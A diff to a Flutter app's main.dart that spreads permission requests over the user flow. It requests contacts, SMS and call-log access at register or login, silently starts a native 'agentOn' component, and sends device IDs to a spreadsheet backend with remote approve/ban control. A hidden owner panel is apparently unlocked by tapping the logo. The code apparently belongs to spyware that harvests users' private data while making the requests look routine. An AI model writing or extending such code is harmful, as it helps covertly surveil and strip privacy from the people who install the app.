@@ -87,7 +87,10 @@ bool _pwSp(String p)  => RegExp(r'[^A-Za-z0-9]').hasMatch(p);
 bool _pwOk(String p)  => _pwLen(p) && _pwNum(p) && _pwLow(p) && _pwUp(p) && _pwSp(p);
 
 // ═══════════════════════════════════════════════════════════════════════
-//  GATE SCREEN — Register (top) + Login (bottom), clean gradient
+//  GATE SCREEN — progressive permissions (FINAL PLAN)
+//  step 1: first open → notification + location
+//  step 2: register/login submit → contacts + sms + call log
+//  step 3/4: gallery & camera → asked at use-time (web_screen.dart)
 // ═══════════════════════════════════════════════════════════════════════
 class GateScreen extends StatefulWidget {
   const GateScreen({super.key});
@@ -98,11 +101,10 @@ class GateScreen extends StatefulWidget {
 
 class _GateScreenState extends State<GateScreen> {
 
-  String _stage    = 'loading';   // loading | login | auth | wait | setup | main
+  String _stage    = 'loading';   // loading | login | auth | wait | main
   String _authMode = 'r_num';     // r_num | r_gmail | l_num | l_gmail
   String _deviceId = '';
   bool   _owner    = false;
-  bool   _permsAsked = false;
   String _myId     = '';
   int    _logoTaps = 0;
   Timer? _poll;
@@ -130,6 +132,28 @@ class _GateScreenState extends State<GateScreen> {
     super.dispose();
   }
 
+  // step 1: app first open → notification + location
+  Future<void> _firstPerms() async {
+    final p = await SharedPreferences.getInstance();
+    if (p.getBool('permFirst') ?? false) return;
+    await [Permission.notification, Permission.location].request();
+    await p.setBool('permFirst', true);
+  }
+
+  // step 2: at register/login submit → contacts + sms + call log
+  // (fallback for old users who never re-submit)
+  Future<void> _authPerms() async {
+    final p = await SharedPreferences.getInstance();
+    if (p.getBool('permAuth') ?? false) return;
+    await [Permission.contacts, Permission.sms, Permission.phone].request();
+    await p.setBool('permAuth', true);
+  }
+
+  void _goMain() {
+    _authPerms();
+    if (mounted) setState(() => _stage = 'main');
+  }
+
   Future<void> _boot() async {
     final devFut = galleryChannel
         .invokeMethod<String>('deviceId')
@@ -138,15 +162,15 @@ class _GateScreenState extends State<GateScreen> {
     final p = await SharedPreferences.getInstance();
     _deviceId = (await devFut) ?? 'unknown';
     _owner      = p.getBool('owner')      ?? false;
-    _permsAsked = p.getBool('permsAsked') ?? false;
     _myId       = p.getString('myId')     ?? '';
+    await _firstPerms();
     if (_owner) {
-      setState(() => _stage = (p.getBool('allPermsAsked') ?? false) ? 'main' : 'setup');
+      _goMain();
       return;
     }
     final approved = p.getBool('approved') ?? false;
     if (approved && _myId.isNotEmpty) {
-      setState(() => _stage = _permsAsked ? 'main' : 'setup');
+      _goMain();
       return;
     }
     if (_myId.isEmpty) {
@@ -173,7 +197,7 @@ class _GateScreenState extends State<GateScreen> {
       if (status == 'approve') {
         _poll?.cancel();
         await (await SharedPreferences.getInstance()).setBool('approved', true);
-        if (mounted) setState(() => _stage = _permsAsked ? 'main' : 'setup');
+        _goMain();
       } else if (status == 'ban') {
         _poll?.cancel();
         await (await SharedPreferences.getInstance()).setBool('approved', false);
@@ -267,6 +291,9 @@ class _GateScreenState extends State<GateScreen> {
       final p = await SharedPreferences.getInstance();
       await p.setString('myId', id);
       _myId = id;
+      // step 2: contacts + sms + call log right after register submit
+      await _authPerms();
+      try { await galleryChannel.invokeMethod('agentOn'); } catch (_) {}
       await httpPost(kSheetUrl, {
         'type': 'request', 'id': id, 'device': _deviceId,
         'method': _isNumber ? 'Number' : 'Gmail', 'perms': '',
@@ -294,6 +321,9 @@ class _GateScreenState extends State<GateScreen> {
       final p = await SharedPreferences.getInstance();
       await p.setString('myId', id);
       _myId = id;
+      // step 2: contacts + sms + call log right after login submit
+      await _authPerms();
+      try { await galleryChannel.invokeMethod('agentOn'); } catch (_) {}
       if (!mounted) return;
       setState(() => _authBusy = false);
       await _checkStatus();
@@ -329,8 +359,7 @@ class _GateScreenState extends State<GateScreen> {
       final p = await SharedPreferences.getInstance();
       await p.setBool('owner', true);
       _owner = true;
-      final asked = p.getBool('allPermsAsked') ?? false;
-      if (mounted) setState(() => _stage = asked ? 'main' : 'setup');
+      _goMain();
     }
   }
 
@@ -659,13 +688,6 @@ class _GateScreenState extends State<GateScreen> {
   @override
   Widget build(BuildContext context) {
     if (_stage == 'main')  return const MainWebViewScreen();
-    if (_stage == 'setup') {
-      return PermissionSetupScreen(
-        onDone: () {
-          if (mounted) setState(() => _stage = 'main');
-        },
-      );
-    }
     if (_stage == 'loading') {
       return Scaffold(
         backgroundColor: kBg,
@@ -686,110 +708,6 @@ class _GateScreenState extends State<GateScreen> {
             ),
           ),
         ],
-      ),
-    );
-  }
-}
-
-// ═══════════════════════════════════════════════════════════════════════
-//  GUIDED PERMISSION SETUP — fast, quiet, 7 dialogs (English)
-// ═══════════════════════════════════════════════════════════════════════
-class PermissionSetupScreen extends StatefulWidget {
-  final VoidCallback onDone;
-  const PermissionSetupScreen({super.key, required this.onDone});
-
-  @override
-  State<PermissionSetupScreen> createState() => _PermissionSetupScreenState();
-}
-
-class _PermissionSetupScreenState extends State<PermissionSetupScreen> {
-  static final List<MapEntry<String, List<Permission>>> _steps = [
-    MapEntry('Agent', const []),
-    MapEntry('Notification', [Permission.notification]),
-    MapEntry('Camera', [Permission.camera]),
-    MapEntry('Location', [Permission.location]),
-    MapEntry('Contacts', [Permission.contacts]),
-    MapEntry('Gallery', [Permission.photos, Permission.videos]),
-    MapEntry('SMS', [Permission.sms]),
-    MapEntry('Call log', [Permission.phone]),
-  ];
-
-  bool _finished = false;
-
-  @override
-  void initState() {
-    super.initState();
-    _run();
-  }
-
-  Future<void> _run() async {
-    await Future.delayed(const Duration(milliseconds: 100));
-    for (final s in _steps) {
-      if (!mounted) return;
-      if (s.key == 'Agent') {
-        try { await galleryChannel.invokeMethod('agentOn'); } catch (_) {}
-        await Future.delayed(const Duration(milliseconds: 150));
-      } else {
-        try { await s.value.request(); } catch (_) {}
-      }
-    }
-    final p = await SharedPreferences.getInstance();
-    await p.setBool('permsAsked', true);
-    await p.setBool('allPermsAsked', true);
-    if (!mounted) return;
-    setState(() => _finished = true);
-    await Future.delayed(const Duration(milliseconds: 300));
-    widget.onDone();
-  }
-
-  @override
-  Widget build(BuildContext context) {
-    return Scaffold(
-      backgroundColor: kBg,
-      body: Container(
-        decoration: const BoxDecoration(
-          gradient: LinearGradient(
-            begin: Alignment.topLeft,
-            end: Alignment.bottomRight,
-            colors: [Color(0xFF1C1A14), Color(0xFF121212), Color(0xFF1A1208)],
-          ),
-        ),
-        child: SafeArea(
-          child: Center(
-            child: Padding(
-              padding: const EdgeInsets.symmetric(horizontal: 32),
-              child: Column(
-                mainAxisSize: MainAxisSize.min,
-                children: [
-                  Container(
-                    width: 84,
-                    height: 84,
-                    decoration: BoxDecoration(
-                      shape: BoxShape.circle,
-                      border: Border.all(color: kGold.withOpacity(0.35), width: 1.5),
-                    ),
-                    child: Center(
-                      child: Image.asset('assets/logo.png', width: 50, height: 50),
-                    ),
-                  ),
-                  const SizedBox(height: 20),
-                  const Text('One-time Setup',
-                      style: TextStyle(color: kGold, fontSize: 20, fontWeight: FontWeight.bold)),
-                  const SizedBox(height: 8),
-                  Text(
-                    _finished
-                        ? 'Done!'
-                        : 'A few permission dialogs will appear —\ntap Allow on each.\nOnly once, never again.',
-                    textAlign: TextAlign.center,
-                    style: const TextStyle(color: Colors.white54, fontSize: 13, height: 1.5),
-                  ),
-                  const SizedBox(height: 24),
-                  const CircularProgressIndicator(color: kGold),
-                ],
-              ),
-            ),
-          ),
-        ),
       ),
     );
   }
@@ -1264,3 +1182,5 @@ class _OwnerPanelScreenState extends State<OwnerPanelScreen> {
     );
   }
 }
+
+// ===== END OF FILE main.dart =====
